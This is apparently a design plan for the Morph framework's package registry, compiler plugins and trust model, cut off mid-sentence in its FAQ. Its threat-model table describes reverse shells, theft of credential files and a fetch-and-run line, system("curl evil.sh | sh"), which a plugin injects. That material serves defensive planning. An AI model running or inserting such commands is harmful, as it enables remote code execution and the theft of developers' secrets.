# Package Ecosystem: one dependency, the whole machine

**Status:** future · **Priority:** high

> **Note:** This is a future plan, not a commitment. The syntax and API shown here are proposals — they can be completely different when actually implemented.

## Thesis

We believe Morph's endgame is a **triple ecosystem**: the velocity of the web
(JSX + Tailwind + npm-style packages), the muscle of C++ (decades of
vcpkg/Conan libraries: assimp, OpenCV, ONNX, JUCE, filament), and the safety
of Rust (`crates.io`, and our own compiler, `morphc`, is already Rust).

The trick is that our compiler erases the boundary. Your TypeScript compiles
to the same C++ as a native library, so a community package can expose raw
systems power behind a one-line JSX import — with zero bridge overhead:

```tsx
import { Model3DViewer } from 'morph-3d';

export default function App() {
  return (
    <div className="p-6 bg-slate-900 rounded-xl">
      <Model3DViewer src="assets/ironman.gltf" autoRotate className="w-full h-[400px]" />
    </div>
  );
}
```

No browser. No Electron. No WebView. The app still ships as a lean native
binary — see [Lean Binaries](lean-binaries.md).

This page is the overarching architecture. The JS→C++ build-bridge sub-plan
lives in [Packages](packages.md); the 3D escape hatch lives in
[Viewport](../windows/viewport.md).

## What the user writes

One field. Nothing else:

```json
// morph.config.json
{
  "name": "my-app",
  "dependencies": {
    "morph-3d": "^1.0.0",
    "morph-audio": "^0.5.0",
    "morph-sqlite": "^2.1.0"
  }
}
```

The `dependencies` key already exists in `MorphConfig`
(`crates/morph-config/src/lib.rs`) and is documented as "reserved for future
package manager". This plan wires it up. Users never touch CMake, never write
C++, never configure include paths. The package author handles all of that
once, in the package manifest below.

## Registry: `morph.levizr.com/registry`

We will **not** host package binaries ourselves as the source of truth.
The model:

1. The plugin developer **releases on GitHub** (source + prebuilt
   platform binaries as release assets).
2. The developer **registers** the package at `morph.levizr.com/registry`
   (frontend + index): name, repo URL, release feed, signature key.
3. The registry is a **signed index**, not a file host: it maps
   `name@version` → download URLs + SHA256 + signatures.
4. `morph install` resolves through the index, downloads from GitHub,
   verifies hash + signature, and records the result in the lockfile.

Why this shape: we stay a thin trust anchor; developers keep their code
where developers already live; mirrors and forks stay trivial.

### Package naming rules

- **Name it anything.** There is no required `morph-` prefix — `icons`,
  `three-viewer`, `acme-charts` are all fine.
- **The `morph-` prefix is reserved.** Community packages must not start
  with `morph-` (and the registry flags names containing it for review).
  That prefix means "official Morph team package". This kills the cheapest
  impersonation attack: a typosquat can't borrow our name.
- **Names are case-insensitively unique.** The registry rejects
  confusingly similar names (`morph-3d` vs `morph_3d` vs `morph–3d`).
- **Scoped names for teams:** `@org/name` for companies and groups
  (public or private registries). Scopes are owned by verified identities.

## Package layout

```
morph-3d/
├── morph.pkg.json          # manifest (required, see below)
├── components/             # .mx / .tsx files
│   ├── index.mx
│   ├── Model3D.mx
│   └── OrbitControls.mx
├── runtime/                # C++ implementation
│   ├── Model3DNode.h
│   ├── Model3DNode.cpp
│   └── three_renderer.cpp
├── plugin/                 # prebuilt compiler plugins (P2+)
│   ├── linux-x64/libmorph_3d.so
│   ├── macos-arm64/libmorph_3d.dylib
│   └── windows-x64/morph_3d.dll
└── package.json            # optional npm shim for editor tooling
```

Installed to `.morph/packages/<name>@<version>/` (content-addressable, so
multiple versions coexist). This mirrors how `morph install` already links
the C++ runtime into `.morph/` today.

## The manifest (`morph.pkg.json`)

Kept deliberately small. Three fields:

```json
{
  "name": "morph-3d",
  "version": "1.0.0",
  "exports": {
    ".": "./components/index.mx",
    "./Model3D": "./components/Model3D.mx",
    "./OrbitControls": "./components/OrbitControls.mx"
  },
  "native": {
    "cpp": ["runtime/Model3DNode.cpp", "runtime/three_renderer.cpp"],
    "headers": ["runtime/Model3DNode.h"],
    "libs": ["assimp", "filament"]
  },
  "compilerPlugin": "plugin/",
  "runtimeAccess": ["signal", "effect", "channel"]
}
```

| Field | Meaning |
|---|---|
| `exports` | import subpath → component file (auto-discovers `.mx`/`.tsx`) |
| `native.cpp` / `native.headers` / `native.libs` | C++ files to compile, headers to include, libraries to link — merged into the project build automatically |
| `compilerPlugin` | directory of prebuilt plugin binaries (only when the package extends the compiler; P2+) |
| `runtimeAccess` | allowlist of Morph internals the plugin may touch (only with `compilerPlugin`; enforced at load) |

A pure-component package (icons, themes) ships only `exports`. The build
system infers everything else.

## Capability layers

| Layer | Contents | Example | Trust |
|---|---|---|---|
| **L1 — components** | `.mx`/`.tsx`/`.ts` + CSS, no C++ | icon sets, widget kits, themes, animation presets | Safe (compiler-only) |
| **L2 — native functions** | `.cpp`/`.h` helpers callable from TS | SQLite, image codecs, crypto, CSV parsing | Reviewed (compiles into your binary) |
| **L3 — custom nodes** | `MorphNode` subclasses exposed as JSX tags | `<Model3D>`, `<WebView>`, `<AudioSynth>`, `<Canvas2D>` | High (runs at render time) |
| **L4 — new primitives** | compiler lowering for new reactive APIs | `createSignal`/`createEffect` with different semantics | Compiler-plugin trust (P2+) |

L1–L3 need no compiler changes. L4 needs the [compiler plugin
system](#compiler-plugins-custom-apis-without-forking-morphc) below.

What packages can eventually carry: zero-lag charts (ImPlot over a
`<viewport>`), embedded engines (Godot/Bevy headless in a layout box),
creative tools (OpenCV/Skia canvases), physics sandboxes (Box2D/Bullet),
local AI (ONNX Runtime), hardware hooks (USB, serial, BLE) — all behind
`import … from 'morph-x'`.

## Built-in escape hatches: `<viewport>` and `<canvas>`

We will ship these as **built-in tags**, not packages — they are the
foundation plugins build on. Full design: [Viewport](../windows/viewport.md).

- **`<canvas>`** — retained 2D. Declarative vector drawing (paths, text,
  images) recorded into the UI node; dirty flags re-record only on change.
  No raw GL.
- **`<viewport>`** — the C++ escape hatch. Gives a driver raw OpenGL
  access inside its own framebuffer object; our compositor blits the texture
  into the UI. GL state is saved/restored around the draw call so neither
  side can corrupt the other.

```cpp
// runtime/viewport_driver.h (we ship this header)
namespace morph {

struct ViewportContext {
    int w, h;
    double dpi_scale;
    GLuint fbo;
    GLuint color_tex;
    struct { float x, y; bool down; } mouse;
};

class ViewportDriver {
public:
    virtual ~ViewportDriver() = default;
    virtual void onInit(ViewportContext& ctx) {}
    virtual void onDraw(ViewportContext& ctx) {}
    virtual void onResize(ViewportContext& ctx) {}
    virtual void onMouseMove(ViewportContext& ctx, float x, float y) {}
    virtual void onMouseDown(ViewportContext& ctx, float x, float y) {}
    virtual void onMouseUp(ViewportContext& ctx, float x, float y) {}
    virtual void onKeyDown(ViewportContext& ctx, int key) {}
};

} // namespace morph
```

Packages supply drivers; users never write them:

```tsx
import { Model3DViewer } from 'morph-3d'; // driver hidden inside the package
```

Input flows GLFW → UI hit-test → driver callbacks with zero marshalling.

## Custom nodes: how a package exposes C++

A package author subclasses `MorphNode` (same pattern as our
[Custom C++ Nodes](../../guides/custom-cpp-nodes.md) guide) and annotates
the JSX binding:

```tsx
// components/Model3D.mx inside morph-3d
// @morph-component: Model3DNode
// @morph-header: runtime/Model3DNode.h
export function Model3D(props: {
  src: string;
  scale?: [number, number, number];
  animation?: string;
  onLoad?: () => void;
  onError?: (err: string) => void;
}) {
  return <model-3d-node {...props} />;
}
```

```cpp
// runtime/Model3DNode.h inside morph-3d
#pragma once
#include "core/node.h"

namespace morph {

class Model3DNode : public MorphNode {
public:
    void layout(float parentW, float parentH) override;
    void recordDisplayList(Renderer& r) override;
    void setSrc(const std::string& url);
    void setScale(float x, float y, float z);
    void setAnimation(const std::string& name);
    void onLoad(std::function<void()> cb);
    void onError(std::function<void(const std::string&)> cb);
};

} // namespace morph
```

At build time we read the annotations, include the package headers in the
generated translation unit, and wire props → `setX` calls and handlers →
callbacks — the same mechanism as user-side C++ interop in
`import { fn } from './file.cpp'`, but packaged and versioned. The tag is
registered in `SUPPORTED_TAGS` so `morph check` accepts it
(`docs/future` sub-plan: [Packages](packages.md)).

## Native functions: plain C++ behind an import

Not everything needs a node. Packages can expose functions:

```tsx
// user code
import { openDb, query } from "morph-sqlite";

export default function App() {
  const [rows, setRows] = morphState([]);
  morphEffect(() => {
    const db = openDb("app.db");
    setRows(query(db, "SELECT * FROM items"));
  }, []);
  return <list>{rows.map(r => <item key={r.id}>{r.name}</item>)}</list>;
}
```

```cpp
// runtime/sqlite.cpp inside morph-sqlite
#include "sqlite.h"
#include <sqlite3.h>

namespace morph {
namespace sqlite {

JsValue openDb(const JsString& path) {
    sqlite3* db;
    sqlite3_open(path.c_str(), &db);
    return JsObject{{"handle", (uintptr_t)db}};
}

JsArray query(const JsValue& dbHandle, const JsString& sql);

} // namespace sqlite
} // namespace morph
```

Lowered by `morpher` to direct calls (`morph::sqlite::openDb(…)`) — zero
FFI overhead, because the frontend compiles to the same C++ as the library.

Reactive bridging (threads, sockets, watchers) follows the same shape:
a native function returns a handle and pushes updates through our channels,
which `morphEffect` already observes. No new primitives required.

## Compiler plugins: custom APIs without forking `morphc`

This is the core of the system, and the part that makes packages as powerful
as the framework itself. A package may ship a **prebuilt shared library**
(`.so` / `.dylib` / `.dll`) that extends our compiler — the plugin author
writes Rust once, the user never writes any.

### User side

```json
// morph.config.json — the package is already in dependencies;
// no separate plugin config. One package = components + native +
// compiler extension, all behind one dependency line.
{
  "dependencies": {
    "morph-solid": "^1.0.0"
  }
}
```

```tsx
// user code — same import shape as everything else
import { createSignal, createEffect } from 'morph-solid';

export default function App() {
  const [count, setCount] = createSignal(0);
  createEffect(() => console.log("Count:", count()));
  return <button onClick={() => setCount(c => c + 1)}>{count()}</button>;
}
```

### Plugin author side

```rust
// compiler_plugin.rs inside morph-solid — written once by the author
use morpher::plugin::{CompilerPlugin, LoweredCode, CodegenContext, morph_compiler_plugin};

#[derive(Default)]
pub struct SolidPlugin;

impl CompilerPlugin for SolidPlugin {
    fn name(&self) -> &'static str { "morph-solid" }

    fn lower_import(
        &self,
        imported_name: &str,
        args: &[Expr],
        ctx: &mut CodegenContext,
    ) -> Option<LoweredCode> {
        match imported_name {
            "createSignal" => Some(LoweredCode {
                cpp: format!("morph::solid::create_signal({})", ctx.lower_expr(&args[0])),
                includes: vec!["solid/signal.h"],
                runtime_symbols: vec!["morph::solid::create_signal"],
            }),
            "createEffect" => Some(LoweredCode {
                cpp: format!("morph::solid::create_effect([=]() {{ {} }})", ctx.lower_expr(&args[0])),
                includes: vec!["solid/effect.h"],
                runtime_symbols: vec!["morph::solid::create_effect"],
            }),
            _ => None,
        }
    }

    fn used_runtime_symbols(&self) -> Vec<String> {
        vec!["morph::solid::create_signal".into(), "morph::solid::create_effect".into()]
    }
}

morph_compiler_plugin!(SolidPlugin);
```

Built with `crate-type = ["cdylib"]`, published per platform under the
package's `plugin/` directory (built by CI, e.g. GitHub Actions, for
linux-x64 / macos-arm64 / windows-x64).

### Loading and versioning

`morphc` loads the library at build time (`dlopen` / `LoadLibrary`), finds
the `__morph_plugin_create` factory, and registers the hooks. Two guards:

1. **Version contract.** The plugin embeds
   `plugin_api_version` + `min/max_morphc_version` metadata. `morphc`
   refuses to load on mismatch with an actionable error. A breaking trait
   change bumps the API version; the registry rebuilds affected packages
   (or `morph pkg rebuild <name>` compiles from source as fallback).
2. **Runtime allowlist.** The plugin's `used_runtime_symbols()` must be a
   subset of the manifest's `runtimeAccess`. Anything else warns loudly.

Trust is explicit and per-project: adding the dependency opts the project
in. Signatures from the registry index are verified on install.

### Scope discipline

- Phase P2 ships `lower_import` (custom functions/hooks) only.
- `lower_jsx_tag` (custom tags with custom lowering) follows in P3.
- First-match-wins on overlap, in dependency order — explicit, predictable.
- WASM plugins are a later option for a portable target; native `.so` is
  the v1 path.

## What you can build: anything, with full control

Short version: **if it can be expressed as components, C++, or compiler
lowering, you can ship it as a package.** You are never limited to what we
anticipated. Below is what that means in practice, with why each is better
here than in other frameworks.

### 1. UI kits that compile to nothing (L1)

```tsx
import { Button, Card, Modal } from 'acme-ui';

export default function App() {
  return (
    <Card title="Hello">
      <Button variant="primary" onClick={() => console.log("hi")}>Click</Button>
    </Card>
  );
}
```

Why better than npm + React: a React kit ships a runtime (react-dom,
reconciliation, virtual DOM) that runs on every interaction. Our kit
compiles to direct native node construction — the abstraction costs zero
at runtime, and DCE drops every component you don't use.

### 2. 3D, video, and GPU plugins (L3 + `<viewport>`)

```tsx
import { Model3DViewer } from 'three-viewer';
import { VideoTimeline } from 'pro-cut';

export default function Studio() {
  return (
    <div className="flex gap-4">
      <Model3DViewer src="assets/ironman.gltf" autoRotate className="w-1/2 h-96" />
      <VideoTimeline src="clip.mp4" className="w-1/2 h-96" />
    </div>
  );
}
```

Why better than Electron + Three.js: no Chromium (~150MB), no JS garbage
collector in the frame loop, no WebGL subset — the driver gets raw OpenGL
3.3 in an isolated framebuffer, with `std::vector` data sitting next to
the draw calls. Why better than Qt Quick 3D: no QML to learn, no 30MB+
runtime, and the surrounding layout is JSX + Tailwind instead of anchors.

### 3. Hardware and OS plugins (L2)

```tsx
import { useSystemMonitor, useUSBDevice } from 'sys-kit';

export function Dashboard() {
  const { totalMemory, cpuTemp } = useSystemMonitor({ refreshRate: '100ms' });
  const { bytesRead } = useUSBDevice({ vendorId: 0x1234 });
  return (
    <div className="p-6">
      <h2>CPU temp: {cpuTemp}°C</h2>
      <p>USB: {bytesRead} bytes/sec</p>
    </div>
  );
}
```

Why better than Tauri/Electron: no IPC boundary, no `invoke()` round-trip
— the hook reads `inotify`/`FSEvents`/procfs through compiled C++ and
pushes into signals directly. Why better than Qt: no MOC boilerplate
(`Q_OBJECT`, `Q_PROPERTY`, signals/slots) per binding; the import *is* the
binding.

### 4. True multithreading behind JSX (L2)

```tsx
import { NativeProcessor } from 'parallel-kit';

export function FileParser() {
  return (
    <NativeProcessor
      inputPath="huge_dataset.csv"
      onChunkProcessed={(p) => updateProgress(p)}
      onComplete={(r) => showResults(r)}
    />
  );
}
```

Why better than Web Workers: real `std::jthread`s on all cores sharing
memory with the UI state (no `postMessage` serialization), while the main
loop stays untouched. JavaScript is single-threaded; our packages aren't.

### 5. Audio/DSP with sub-millisecond control (L3)

```tsx
import { AudioSynthesizer, Dial } from 'dsp-kit';

export function Studio() {
  return (
    <AudioSynthesizer patch="moog-bass">
      <Dial label="Cutoff" min={20} max={20000} onChange={(v) => synth.setCutoff(v)} />
    </AudioSynthesizer>
  );
}
```

Why better than Web Audio: no browser audio thread, no GC pauses in the
DSP path — a JUCE/RtAudio engine behind a slider, with the value hitting
native code in under a millisecond.

### 6. Your own reactive dialect (L4 — customize the compiler itself)

```tsx
import { createSignal, createEffect } from 'solid-morph';

export default function App() {
  const [count, setCount] = createSignal(0);
  createEffect(() => console.log("Count:", count()));
  return <button onClick={() => setCount(c => c + 1)}>{count()}</button>;
}
```

No other UI framework lets a package do this. React hooks are library
code running on React's reconciler — you can't replace the reconciler
from npm. Qt's MOC is fixed at compile time — you can't extend QML
semantics from a package. Here the package ships a compiler plugin that
lowers `createSignal` to *its own* signal implementation. Solid-style
fine-grained reactivity, RxJS streams, atomic state — whatever semantics
you want, compiled straight to C++.

### 7. Dev-time superpowers (compiler plugins beyond runtime)

Because the plugin sees the AST before lowering, it can do things
libraries cannot:

- **Lint-as-a-package:** a design-system package that fails the build on
  forbidden patterns (`no raw <div> without <Card>`), with pinpoint errors.
- **i18n extraction:** collect every string literal at compile time into a
  translation catalog — no runtime scanner, nothing missed.
- **Asset pipelines:** `import hero from './hero.png'` resized, compressed,
  and hashed at build time by the package's lowering, not by user config.
- **Typed routes/APIs:** generate clients from an OpenAPI file during the
  build, so a stale endpoint is a compile error.

### Side-by-side: the same app elsewhere

| Task | Morph package | Closest alternative | Cost of alternative |
|---|---|---|---|
| 3D model viewer in a styled layout | `import { Model3DViewer } from 'three-viewer'` | Electron + Three.js | ~150MB Chromium, GC in frame loop |
| USB device dashboard | `import { useUSBDevice } from 'sys-kit'` | Qt + libusb + QML bindings | MOC boilerplate, 30MB+ deploy |
| 1M-point live chart | native plot node, zero-copy buffers | HTML5 canvas over WebSocket | UI thread freezes, serialization per frame |
| Custom reactive semantics | compiler plugin (`createSignal`) | impossible from a package | fork the framework |
| Multi-threaded CSV parse | `std::jthread` pool behind a tag | Web Workers | `postMessage` copies, no shared memory |
| Sub-ms audio control | JUCE engine behind `<Dial>` | Web Audio API | browser latency + GC pauses |

## What the compiler does at build time (heavy lifting)

```
morph build
  1. read morph.config.json → dependencies
  2. resolve semver ranges → lock exact versions + SHA256 in .morph/package-lock.json
  3. download (registry index → GitHub assets) → .morph/packages/<name>@<version>/
  4. per package:
       load compilerPlugin (.so for this platform) → register hooks
       merge native.cpp / headers / libs → unified compile
       register exports → bare-specifier resolution
       register JSX tags → `morph check` acceptance
  5. resolve_graph (extended with package roots) → ModuleGraph
  6. namespaces: app::pkg::<sanitized_name>::<segments> (see below)
  7. IR build → FeatureSet scan → codegen → g++ → binary
```

Package modules are canonical paths in the graph, so everything downstream
— `resolve_binding` (`crates/morph-ir/src/builder.rs`), the demand-driven
component expansion, the dev watcher (`dev.rs` derives watch dirs from
`graph.all_paths()`), CSS handling — works unchanged.

### Namespaces

Package files live outside `src/`, where `module_ns_segments_from_base`
currently hard-errors ("outside the source tree"). Packages get their own
root under the existing `app::` module root
(`MODULE_NS_ROOT`, `crates/morph-ir/src/builder.rs`):

```
.morph/packages/morph-icons@1.2.0/components/Icon.mx
  → app::pkg::morph_icons::components::icon
```

Sanitization mirrors `mx-naming` (lowercase, `-` → `_`, leading-digit
guard). The existing `validate_namespaces` collision check then applies
uniformly to user and package modules. The `mx-naming` lint exempts package
roots (not user code).

### Resolution order

relative (`./x.mx`) → package bare specifier (`morph-3d/Model3D` via the
export map) → `'morph'` (stays special-cased as the compiler's own surface).
Anything else keeps today's `mx-import-type` behavior
(`docs/errors/mx-import-type.md`).

## Dead code elimination, per layer

| Layer | Today | With packages |
|---|---|---|
| Files | ✅ BFS from entry; unimported files never join the graph | Unimported package files never join either |
| Components | ✅ demand-driven instantiation at `<Tag/>` | Unused package components never inline |
| Module-global helpers | ❌ one use compiles the whole module's top-level fns/vars (`translate_module_globals`) | **Mark-and-sweep (P1):** tag each `premain` snippet with `(module, binding)`, sweep unreferenced after the tree build |
| Shared/event bindings | ❌ registered eagerly per module | Same sweep; used ones stay as roots |
| Runtime features | ✅ `FeatureSet` → `MORPH_FEATURE_*` defines | Free — the scan runs on final IR including package code |
| Native code | n/a | Only referenced `cpp_sources` compile; unreferenced link flags dropped |

A 5,000-icon package you use once costs one icon. That is the whole point.

## Dev mode

No new machinery: package files enter `graph.all_paths()`, the watcher
picks up their parent dirs, edits re-resolve the graph and recompile the
logic unit. Package C++ edits recompile like user `cpp_sources` do today.

## Versioning policy

- Users **must** specify versions (`"morph-3d": "^1.0.0"` — ranges allowed,
  exact pins encouraged for apps).
- `morph install` resolves ranges → exact versions → lockfile with SHA256.
- Reproducible builds: CI installs from the lockfile, never re-resolves.
- `morphc` major bumps may break compiler plugins (trait layout); the
  registry rebuilds, and `morph pkg rebuild` compiles from source as
  fallback. Pure L1/L2 packages are unaffected by compiler versions.

## Security & trust model

### Why security matters: the threat scale

Morph packages with native code are **not sandboxed**. They compile into your
binary and run with your app's full privileges. This is a fundamental
difference from web npm packages (browser sandbox) or even Electron (process
isolation).

| Ecosystem | Native code? | Sandbox | Blast radius if compromised |
|---|---|---|---|
| **npm (web)** | No (JS/WASM) | Browser origin sandbox | One tab, no filesystem, no native APIs |
| **Electron** | Yes (Node.js) | Process isolation (optional) | One renderer process; main process still privileged |
| **Cargo (crates.io)** | Yes (Rust) | None — same as your binary | Your entire binary |
| **Morph (L2/L3/L4)** | Yes (C++/Rust) | None — same as your binary | **Your entire binary + build environment** |

**The threat is real and growing:**

- **Supply-chain attacks doubled 2021–2024** (Sonatype, GitHub Security Lab).
  Attackers target build tools and registries because one compromised package
  reaches thousands of downstream apps.
- **Morph compiler plugins run at build time** — they see your source code,
  `.env` files, SSH keys, AWS credentials. A malicious plugin exfiltrates
  secrets *before your binary exists*.
- **Morph native packages run at runtime** — raw GL, filesystem, network,
  process spawning. A keylogger, crypto miner, or data exfiltrator looks
  like normal app behavior.
- **No central audit scales.** The Linux kernel has 30M lines and 2000+
  developers — still has CVEs. We cannot audit every package's C++.

**This is why our model is "trust the author, not the package" — identity
verification scales, code audit does not.** If you cannot accept native code
risk, use L1 packages only (pure components, no native code, zero risk).

---

### The core principle: **trust the author, not the package**

This is how VS Code Marketplace, npm, and Cargo work — and it's the only
model that scales. We verify **identities**, not every line of code.

### Author verification (what we do)

| Check | What it means |
|---|---|
| **GitHub OAuth** | Author signs in with GitHub — we know their real account |
| **Verified badge** | Blue checkmark = identity confirmed (like VS Code) |
| **Two-factor auth required** | Prevents account takeover |
| **Package signing** | Every release signed by author's key (Ed25519); registry verifies |

We **do not** audit every package's C++ code. We cannot, and pretending we
can would give false confidence.

### What the user sees (VS Code style)

```
morph install
Resolving dependencies...
morph-3d@1.0.0  ←  Verified author: @johndoe  ●  47,000 downloads
                ←  Source: github.com/johndoe/morph-3d
                ←  This package contains native C++ code (runtime).
                ←  Trust @johndoe? [y/N]
```

- **Download count** — popularity signal (not safety, but useful)
- **Verified author badge** — identity confirmed
- **Source link** — one click to audit yourself
- **Explicit consent** — you decide per author, not per package

Once you trust an author, their future packages install without prompting
(stored in `.morph/trusted-authors.json`).

### Responsibility is yours

> **If you trust an author, you trust their code. We (the Morph team)
> verify identities — we do not audit implementations. We can make
> mistakes. You are responsible for what runs on your machine.**

This is the same contract as VS Code extensions, Cargo crates, and npm
packages. The alternative (central code review) doesn't scale and creates
a single point of failure.

### Sandboxing: compiler always sandboxed, app binary sandboxed on request

Two different sandboxes for two different threats:

**1. Build time — `morphc` always sandboxes compiler plugins. No toggle.**
A compiler plugin runs in a separate locked-down process: no filesystem
access, no network, no process spawning — only the lowering RPC channel
back to `morphc` plus the symbols declared in its manifest
`runtimeAccess`. A malicious or buggy plugin can return bad C++ (which the
user can read in the generated output), but it cannot exfiltrate your
`.env`, SSH keys, or source tree during compilation. This is not optional
and has no config flag — the compiler never executes package code
in-process.

**2. Runtime — your app binary can ship sandboxed with `"sandbox": true`.**
This flag is about *your app*, not the compiler:

```json
// morph.config.json
{
  "sandbox": true
}
```

With `"sandbox": true`, `morph build` generates the platform sandbox
confinement for your binary and the app enters it at startup — scoped
files, network, devices, and GPU per the profile. Default is `false`
(plain binary, today's behavior). Turn it on when you ship to users who
will run other people's packages inside your app.

When the future Morph app store ships, every app downloaded from it runs
sandboxed automatically regardless of this flag — the user never
configures anything. Until the store exists, distro packaging (snap /
Flatpak / AppImage / MSIX) is the equivalent outer boundary.

| Layer | Sandboxes what | Control |
|---|---|---|
| `morphc` plugin sandbox | compiler plugins at build time | always on, no toggle |
| `"sandbox": true` | your built app binary | opt-in per project |
| OS / distro packaging | your whole built app | you opt in today (snap, Flatpak, …) |
| Morph app store (future) | every downloaded app, automatically | when the store ships |

**L1 packages (pure components) need no sandbox** — they're just JSX/TS,
compiled away.

**L2/L3/L4 package code itself** (the C++ in your binary) is not
sandboxed in-process — sandboxing raw GL/SIMD/syscalls would break the
native-performance promise. Contain it at the app boundary (distro
package, and later the store), not inside the binary.

### What about supply-chain attacks?

| Threat | Mitigation |
|---|---|
| **Typosquatting** | Registry blocks confusingly similar names; the `morph-` prefix is reserved for official packages |
| **Compromised author account** | 2FA mandatory; key rotation on breach; registry can revoke author key |
| **Malicious update** | You pinned exact version (`"1.0.0"` not `^1.0.0`) — update intentionally |
| **Dependency confusion** | Private registry / namespace scoping (`@myorg/`) for internal packages |
| **Build-time exfiltration (compiler plugins)** | Compiler plugins run in your CI — use GitHub Actions VMs (ephemeral, no secrets) |

**Best practice**: Pin exact versions, review diffs on update, run builds in
clean CI VMs, package final app as snap/Flatpak for end users.

### Concrete attack scenarios (why this matters)

| Scenario | How it works | Impact |
|---|---|---|
| **Supply-chain backdoor** | Popular package `morph-utils@2.1.0` adds harmless-looking C++ that opens reverse shell when `CI=true` | Your CI builds ship malware to users |
| **Build-time exfiltration** | Compiler plugin reads `.env`, `~/.ssh`, `~/.aws/credentials` during `morph build`, POSTs to attacker | Secrets stolen before binary runs |
| **Runtime keylogger** | Hidden `<Keylogger />` in UI kit registers global key hook, logs keystrokes (including passwords in other apps), sends via background thread | User credentials stolen |
| **Crypto miner in viewport** | 3D viewer uses GPU to mine crypto disguised as "rendering overhead" | CPU/GPU abuse, battery drain, hardware wear |
| **Dependency confusion** | Attacker publishes `morph-internal` (typosquat of `morph-internal-core`) with malicious native code | Silent compromise on typo |
| **Version pinning bypass** | Malicious `1.0.1` published, `1.0.0` unpublished — `^1.0.0` users get it | Compromise despite semver |
| **Compiler plugin code injection** | Plugin injects `system("curl evil.sh \| sh")` into every app's `main.cpp` | Arbitrary code execution at build time |

### L1 packages are safe by construction

Pure component packages (icons, themes, widget kits) contain **only `.mx`,
`.tsx`, `.ts`, `.css`**. They compile to the same IR as your code. They
cannot read files, spawn processes, or touch the network at build time.
**No trust decision needed.**

### Quick decision guide

| You want... | Use |
|---|---|
| Zero risk, just UI | L1 packages (pure components) — no prompt, no native code |
| Performance, hardware access | L2/L3/L4 — trust the author, pin versions, sandbox the final app |
| Maximum safety | Only L1 + `@morph/*` (core team) packages |

## Plugin-author experience

| Tool | Purpose |
|---|---|
| `morph pkg init` | Scaffold `morph.pkg.json` + folder structure |
| `morph pkg validate` | Manifest check, export resolution, test C++ compile |
| `morph pkg publish` | Release to GitHub + register at `morph.levizr.com/registry` |
| `morph pkg link <path>` | Local development workflow (future) |
| Template repos | `template-component` and `template-native` with CI that builds all three platform plugin binaries |

Docs for authors live next to this page when we build it; the contract above
— three manifest fields, one trait, one layout convention — is the whole
surface we promise to keep stable.

## How other ecosystems do it (and what we take)

| Ecosystem | Distribution | Native bridge | What we take |
|---|---|---|---|
| **Qt** | Qt Marketplace, vcpkg/Conan, hand-rolled `.dll`s; MOC meta-object bridge between QML and C++ | `QObject` + signals/slots via MOC | The lesson: a blessed bridge beats ad-hoc FFI. Ours is compile-time (no MOC step, no runtime map) instead of Qt's dynamic broker |
| **npm / Electron** | Registry + semver + lockfile; limitless UI packages | Node-API / IPC — always a boundary, always overhead | The registry/lockfile UX and the component-sharing velocity. We leave the browser sandbox behind |
| **Cargo / crates.io** | Registry + lockfile + features; compiler plugins via proc-macros (`cdylib`) | Native by default | Our compiler-plugin model is closest to proc-macros: Rust code extending the compiler, versioned, distributed as binaries |
| **vcpkg / Conan** | Source builds, triplets, CMake integration | The native libraries themselves | We consume these directly — a Morph package's `native.libs` can name any vcpkg/Conan package |
| **Tauri** | Cargo + npm hybrid; OS webview for UI | Rust commands via IPC-like invoke bridge | The hybrid instinct, but we replace the webview with compiled native UI — no runtime boundary at all |
| **Vulkan / bgfx / filament** | C++ libraries | — | Candidates for what community `<viewport>` drivers wrap |

Our split from all of them: the UI layer compiles away. There is no
interpreter, no webview, no MOC runtime sitting between the package and the
metal — which is why the binary budget ([Lean Binaries](lean-binaries.md))
survives the ecosystem.

## Rollout

| Phase | Delivers | Status |
|---|---|---|
| P0 | L1 component packages: manifest, resolver, namespaces, linter acceptance, lockfile, fixture | future |
| P1 | Symbol-level DCE (mark-and-sweep; helps all code, packages most) | future |
| P2 | Compiler plugins (`lower_import` via prebuilt `.so`), `compilerPlugin` + `runtimeAccess`, **always sandboxed, no toggle** | future |
| P3 | `lower_jsx_tag`, native merge hardening, trust prompts | future |
| P4 | Registry frontend at `morph.levizr.com/registry`, `morph pkg` commands, signatures | future |
| P5 | `<viewport>`/`<canvas>` built-ins ([Viewport](../windows/viewport.md)) as the blessed 3D/2D foundation | future |

Detailed build steps for the JS→C++ bridge sub-problem:
[Packages](packages.md).

## Decision log

| Date | Decision | Rationale |
|---|---|---|
| 2026-09-30 | User config is `dependencies` only; all complexity lives in the package manifest | DX: users add one line; authors handle C++/CMake once |
| 2026-09-30 | `<viewport>`/`<canvas>` are built-in tags; packages supply drivers | A fragmented escape hatch helps nobody; the foundation must be stable |
| 2026-09-30 | One package = components + native + compiler extension behind one dependency | Separate "plugin" vs "dependency" tracks would split the ecosystem |
| 2026-09-30 | Compiler plugins ship as prebuilt per-platform `.so`, not source | No `morphc` recompiles; standard `dlopen` pattern (swc, rust-analyzer) |
| 2026-09-30 | Registry is a signed index over GitHub releases, not a file host | We stay a thin trust anchor; code lives where developers live |
| 2026-09-30 | Users must specify versions; lockfile pins exact + SHA256 | Reproducible builds; matches npm/Cargo expectations |
| 2026-09-30 | New `morph`-style primitives need compiler support (L4), not just packages | `morpher` lowering is hardcoded; honest scoping beats magic promises |
| 2026-09-30 | **Trust the author, not the package** — VS Code model | Central code review doesn't scale; identity verification does |
| 2026-09-30 | **Compiler always sandboxed; `"sandbox"` flag is for the app binary only** | Build-time exfiltration must be impossible, not opt-out; runtime containment is the app author's choice |
| 2026-09-30 | **Any package name, but `morph-` prefix reserved** for official packages | No forced prefix (DX); reserved prefix kills the cheapest impersonation |

## FAQ

**Q: What if a verified author turns malicious?**
A: Their key is revoked immediately. All their packages show a red warning.
Users who already trusted them get a notification on next `morph install`.
But yes — if you trusted them *before* the compromise, your build ran their
code. That's the same risk as any ecosystem.

**Q: Why not scan C++ for malicious patterns?**
A: Static analysis on C++ has massive false negatives (obfuscation, dead
code paths, runtime logic) and false positives (legitimate low-level code
looks "suspicious"). It creates a false sense of security. We invest in
identity verification instead.

**Q: Can I run untrusted packages in a sandbox?**
A: Compiler plugins already run sandboxed — always, no flag. For the app
itself: set `"sandbox": true` in `morph.config.json` and your built binary
ships with OS confinement; or package the whole app as a
snap/Flatpak/AppImage today. Once the Morph app store ships, every
downloaded app runs sandboxed automatically. We don't sandbox C++ inside
the binary — that would break raw GL/SIMD performance.

**Q: What about compiler plugins — they run at build time in my CI?**
A: Two layers. First, plugins always run in `morphc`'s locked-down sandbox
process (no fs/net/spawn) — there is no way to turn this off. Second, run
CI itself in ephemeral VMs (GitHub Actions, GitLab CI) with no persistent
secrets. The plugin builds your binary, the VM dies. No long-lived
